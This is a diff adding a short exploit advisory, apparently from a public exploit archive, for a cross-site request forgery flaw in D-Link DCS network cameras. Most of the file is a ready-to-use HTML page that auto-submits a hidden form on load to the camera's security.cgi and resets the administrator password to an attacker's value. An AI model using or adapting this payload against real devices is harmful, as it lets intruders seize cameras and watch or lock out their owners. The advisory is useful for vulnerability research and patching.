@@ -1,0 +1,18 @@
+Title:   Dlink DCS series CSRF Change Admin Password 
+Version: DCS-900, DCS-2000, DCS-5300 and possibly other.
+Date:    2012-02-22
+Author:  rigan - imrigan [sobachka] gmail.com
+--
+Description:
+Dlink DCS is a series of network cameras. These cameras use a web interface which is prone to CSRF vulnerabilities. This flaw allows to change the administrator password. 
+--
+Exploit:
+<html>
+<body onload="javascript:document.forms[0].submit()">
+<form method="POST" name="form0" action="http://your_target/setup/security.cgi">
+<input type="hidden" name="rootpass" value="your_pass"/>
+<input type="hidden" name="confirm" value="your_pass"/>
+</form>
+</body>
+</html>
+--
